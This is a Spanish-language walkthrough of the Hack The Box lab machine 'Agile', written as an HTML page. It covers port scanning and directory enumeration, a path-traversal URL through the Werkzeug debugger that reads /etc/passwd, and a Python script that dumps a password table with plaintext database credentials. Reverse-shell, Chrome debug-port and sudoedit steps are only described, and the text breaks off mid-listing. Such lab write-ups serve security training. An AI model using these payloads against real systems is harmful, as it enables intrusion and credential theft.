@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Reconocimiento Comprobamos la disponibilidad de la máquina objetivo:
+1 ping -c 1 10.10.11.203 1 2 3 4 5 6 PING 10.10.11.203 (10.10.11.203) 56(84) bytes of data. 64 bytes from 10.10.11.203: icmp_seq=1 ttl=63 time=44.9 ms --- 10.10.11.203 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 44.928/44.928/44.928/0.000 ms ttl-&amp;gt;63 Linux por proximidad.
+Lanzamos nmap para ver los servicios expuestos:
+1 nmap -p- --open -Pn -n -T5 10.'>
+<title>Agile Machine</title>
+
+<link rel='canonical' href='/p/2023/agile-machine/'>
+
+<link rel="stylesheet" href="/scss/style.min.9e18e1b797c5244ff7885f4c06183827750e5d6f4091e5eea3d7d981de346889.css"><meta property='og:title' content='Agile Machine'>
+<meta property='og:description' content='Reconocimiento Comprobamos la disponibilidad de la máquina objetivo:
+1 ping -c 1 10.10.11.203 1 2 3 4 5 6 PING 10.10.11.203 (10.10.11.203) 56(84) bytes of data. 64 bytes from 10.10.11.203: icmp_seq=1 ttl=63 time=44.9 ms --- 10.10.11.203 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 44.928/44.928/44.928/0.000 ms ttl-&amp;gt;63 Linux por proximidad.
+Lanzamos nmap para ver los servicios expuestos:
+1 nmap -p- --open -Pn -n -T5 10.'>
+<meta property='og:url' content='/p/2023/agile-machine/'>
+<meta property='og:site_name' content='4rtic f0x'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='lfi' /><meta property='article:tag' content='werkzeug' /><meta property='article:tag' content='flask' /><meta property='article:published_time' content='2023-03-16T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-03-16T00:00:00&#43;00:00'/><meta property='og:image' content='/p/2023/agile-machine/landing.png' />
+<meta name="twitter:title" content="Agile Machine">
+<meta name="twitter:description" content="Reconocimiento Comprobamos la disponibilidad de la máquina objetivo:
+1 ping -c 1 10.10.11.203 1 2 3 4 5 6 PING 10.10.11.203 (10.10.11.203) 56(84) bytes of data. 64 bytes from 10.10.11.203: icmp_seq=1 ttl=63 time=44.9 ms --- 10.10.11.203 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 44.928/44.928/44.928/0.000 ms ttl-&amp;gt;63 Linux por proximidad.
+Lanzamos nmap para ver los servicios expuestos:
+1 nmap -p- --open -Pn -n -T5 10."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/2023/agile-machine/landing.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "dark");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">4rtic f0x</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/scripts/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 9v-1a3 3 0 0 1 6 0v1" />
+  <path d="M8 9h8a6 6 0 0 1 1 3v3a5 5 0 0 1 -10 0v-3a6 6 0 0 1 1 -3" />
+  <line x1="3" y1="13" x2="7" y2="13" />
+  <line x1="17" y1="13" x2="21" y2="13" />
+  <line x1="12" y1="20" x2="12" y2="14" />
+  <line x1="4" y1="19" x2="7.35" y2="17" />
+  <line x1="20" y1="19" x2="16.65" y2="17" />
+  <line x1="4" y1="7" x2="7.75" y2="9.4" />
+  <line x1="20" y1="7" x2="16.25" y2="9.4" />
+</svg>
+                
+                <span>Scripts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/cve-exploits/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 9v-1a3 3 0 0 1 6 0v1" />
+  <path d="M8 9h8a6 6 0 0 1 1 3v3a5 5 0 0 1 -10 0v-3a6 6 0 0 1 1 -3" />
+  <line x1="3" y1="13" x2="7" y2="13" />
+  <line x1="17" y1="13" x2="21" y2="13" />
+  <line x1="12" y1="20" x2="12" y2="14" />
+  <line x1="4" y1="19" x2="7.35" y2="17" />
+  <line x1="20" y1="19" x2="16.65" y2="17" />
+  <line x1="4" y1="7" x2="7.75" y2="9.4" />
+  <line x1="20" y1="7" x2="16.25" y2="9.4" />
+</svg>
+                
+                <span>CVE Exploits</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#reconocimiento">Reconocimiento</a></li>
+    <li><a href="#obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso a la máquina víctima</a></li>
+    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>
+      <ol>
+        <li><a href="#sqlalchemy-usuario-corum">SQLalchemy: usuario Corum</a></li>
+        <li><a href="#chrome-remote-debug-port-usuario-edward">Chrome Remote Debug Port: Usuario Edward</a></li>
+        <li><a href="#sudoedit-root">Sudoedit: root</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/2023/agile-machine/">
+                <img src="/p/2023/agile-machine/landing.png"
+                        
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post Agile Machine" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" >
+                HTB
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2023/agile-machine/">Agile Machine</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="reconocimiento">Reconocimiento</h2>
+<p>Comprobamos la disponibilidad de la máquina objetivo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ping -c <span class="m">1</span> 10.10.11.203
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PING 10.10.11.203 (10.10.11.203) 56(84) bytes of data.
+</span></span><span class="line"><span class="cl">64 bytes from 10.10.11.203: icmp_seq=1 ttl=63 time=44.9 ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- 10.10.11.203 ping statistics ---
+</span></span><span class="line"><span class="cl">1 packets transmitted, 1 received, 0% packet loss, time 0ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev = 44.928/44.928/44.928/0.000 ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>ttl-&gt;63</strong> Linux por proximidad.</p>
+<p>Lanzamos nmap para ver los servicios expuestos:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> nmap -p- --open -Pn -n -T5 10.10.11.203 -oG openTCPports
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 18:47 CET
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.203
+</span></span><span class="line"><span class="cl">Host is up (0.048s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65246 closed tcp ports (reset), 287 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 17.95 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Extraemos los puertos del archivo mediante expresiones regulares:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> grePorts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> [!] Open ports: 22,80
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lanzamos los scripts de reconocimiento y versión de nmap para recopilar más información de los servicios expuestos:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> nmap -p22,80 -sVC 10.10.11.203 -oN servicesTCPports
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 18:51 CET
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.203
+</span></span><span class="line"><span class="cl">Host is up (0.046s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://superpass.htb
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Añadimos el dominio a nuestro archivo &ldquo;/etc/hosts&rdquo;.</p>
+<h2 id="obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso a la máquina víctima</h2>
+<p>Principalmente actuamos como si fueramos un usuario normal y vemos como funciona la aplicación, creamos nuestro usuario y guardamos algunas contraseñas; en paralelo dejamos trabajando gobuster para listar directorios:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> gobuster dir -b 301,404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://superpass.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Tras un poco obtenemos:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">2023/03/24 20:47:50 Starting gobuster in directory enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">/download             (Status: 302) [Size: 249] [--&gt; /account/login?next=%2Fdownload]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Con unas contraseñas almacenadas y un usuario creado intentamos acceder:</p>
+<p><img src="/p/2023/agile-machine/agile1.png"
+	width="1899"
+	height="874"
+	srcset="/p/2023/agile-machine/agile1_hu7f22dcfb11a19f57efb578d61aa81805_177695_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile1_hu7f22dcfb11a19f57efb578d61aa81805_177695_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="217"
+		data-flex-basis="521px"
+	
+></p>
+<p>Obtenemos un error y vemos que Werkzeug está por detrás como WSGI.Echando un vistazo más detenidamente al error:</p>
+<p><img src="/p/2023/agile-machine/agile2.png"
+	width="803"
+	height="320"
+	srcset="/p/2023/agile-machine/agile2_hu19a1d3e3733a723d445bf3f095526708_39151_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile2_hu19a1d3e3733a723d445bf3f095526708_39151_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="602px"
+	
+></p>
+<p>Parece ser que hay un parametro que gestiona el fichero que hay que leer para descargar el csv asociado, lo que significa que podemos hacer lo siguiente para poder ver contenido de ficheros del sistema como &ldquo;/etc/passwd&rdquo; para ver posibles usuarios potenciales e intentar iniciar sesión en la aplicación.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> http://superpass.htb/download?__debugger__=yes&amp;cmd=resource&amp;s=9Y5IGB4bxbF6x3mm6I4j&amp;fn=../etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nos descargamos el csv y podemos ver el contenido del archivo. Las líneas más relevantes son:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">corum:x:1000:1000:corum:/home/corum:/bin/bash
+</span></span><span class="line"><span class="cl">edwards:x:1002:1002::/home/edwards:/bin/bash
+</span></span><span class="line"><span class="cl">dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Tres potenciales usuarios.</p>
+<p>Una vez ganado LFI podemos generar el PIN para acceder a la consola &ldquo;debug&rdquo; del servicio web. Hay múltiples recursos en la web; yo en concreto me he basado en el siguiente: <a class="link" href="https://www.bengrewell.com/2023/03/11/cracking-flask-werkzeug-console-pin/"  target="_blank" rel="noopener"
+    >enlace</a>.</p>
+<p>Una vez en la consola de desarrollo podemos ejecutar comandos en la máquina objetivo, por lo que entablamos una reverse shell.</p>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<h3 id="sqlalchemy-usuario-corum">SQLalchemy: usuario Corum</h3>
+<p>Ya dentro del equipo podemos echar un vistazo a los archivos de una forma más eficiente. Hay un archivo de configuración en json con credenciales para la BBDD. Creamos el siguiente script y usamos esta información:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sqlalchemy</span> <span class="kn">import</span> <span class="n">create_engine</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">engine</span> <span class="o">=</span> <span class="n">create_engine</span><span class="p">(</span><span class="s2">&#34;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cols</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">,</span><span class="s2">&#34;password&#34;</span><span class="p">,</span><span class="s2">&#34;url&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cols</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="n">engine</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;SELECT </span><span class="si">%s</span><span class="s1"> FROM passwords;&#39;</span> <span class="o">%</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">: ================================= &#34;</span> <span class="o">%</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>¿Cómo podemos saber las columnas y el nombre de la tabla? Echando un vistazo a los archivos del servicio, en &ldquo;passwords.py&rdquo;:</p>
+<p><img src="/p/2023/agile-machine/agile4.png"
+	width="1371"
+	height="626"
+	srcset="/p/2023/agile-machine/agile4_hu1e4bf2f7124e88c2b6c35ee628f20e59_90579_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile4_hu1e4bf2f7124e88c2b6c35ee628f20e59_90579_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="525px"
+	
+></p>
+<p>Y obtenemos:</p>
+<p><img src="/p/2023/agile-machine/agile3.png"
+	width="697"
+	height="615"
+	srcset="/p/2023/agile-machine/agile3_hu921c80508a90245848ba47ff78559a03_71491_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile3_hu921c80508a90245848ba47ff78559a03_71491_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="113"
+		data-flex-basis="272px"
+	
+></p>
+<h3 id="chrome-remote-debug-port-usuario-edward">Chrome Remote Debug Port: Usuario Edward</h3>
+<p>Una vez conectados a través de ssh, echando un vistazo a los archivos del sistema, veo que chrome está instalado (<code>ls -la /opt</code>) lo que no suele ser común en estas máquinas.</p>
+<p>Si observamos los procesos:</p>
+<p><img src="/p/2023/agile-machine/agile5.png"
+	width="1900"
+	height="428"
+	srcset="/p/2023/agile-machine/agile5_hu6038084ebc702038d9209c0b2f66be0e_134533_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile5_hu6038084ebc702038d9209c0b2f66be0e_134533_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="443"
+		data-flex-basis="1065px"
+	
+></p>
+<p><img src="/p/2023/agile-machine/agile6.png"
+	width="1904"
+	height="832"
+	srcset="/p/2023/agile-machine/agile6_hueb7e9ec380a4e1860c4d2adfc947181e_273789_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile6_hueb7e9ec380a4e1860c4d2adfc947181e_273789_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="549px"
+	
+></p>
+<p>Para poder acceder desde nuestro equipo hacemos &ldquo;port forwarding&rdquo;&quot; vía ssh y accediendo a Chrome:</p>
+<p><img src="/p/2023/agile-machine/agile7.png"
+	width="536"
+	height="147"
+	srcset="/p/2023/agile-machine/agile7_huc6d68a06605737a43a2a4666ae18a0d6_17564_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile7_huc6d68a06605737a43a2a4666ae18a0d6_17564_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="364"
+		data-flex-basis="875px"
+	
+></p>
+<p>Inspeccionando la página:</p>
+<p><img src="/p/2023/agile-machine/agile8.png"
+	width="1859"
+	height="705"
+	srcset="/p/2023/agile-machine/agile8_huf0e7875b7bfe831ebc45fe137c9fc41b_171684_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile8_huf0e7875b7bfe831ebc45fe137c9fc41b_171684_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="632px"
+	
+></p>
+<h3 id="sudoedit-root">Sudoedit: root</h3>
+<p>Ya desde Edwards como dev_admin podemos ejecutar:</p>
+<p><img src="/p/2023/agile-machine/agile9.png"
+	width="1775"
+	height="356"
+	srcset="/p/2023/agile-machine/agile9_hub52211391320c9546db06ca2b28a305d_59351_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile9_hub52211391320c9546db06ca2b28a305d_59351_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="498"
+		data-flex-basis="1196px"
+	
+></p>
+<p>Como versión de sudo tenemos la 1.9.9, por lo que podemos usar la siguiente vulnerabilidad para escribir algún fichero extra:</p>
+<p><img src="/p/2023/agile-machine/agile10.png"
+	width="1187"
+	height="456"
+	srcset="/p/2023/agile-machine/agile10_hu88889bd4b76d03a694a5dc205b30f2f5_52151_480x0_resize_box_3.png 480w, /p/2023/agile-machine/agile10_hu88889bd4b76d03a694a5dc205b30f2f5_52151_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="624px"
+	
+></p>
+<p>Vemos los ficheros que podemos editar ya sea como usuario o grupo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> find / -user dev_admin 2&gt; /dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/home/dev_admin
+</span></span><span class="line"><span class="cl">/app/app-testing/tests/functional/creds.txt
+</span></span><span class="line"><span class="cl">/app/config_test.json
+</span></span><span class="line"><span class="cl">/app/config_prod.json
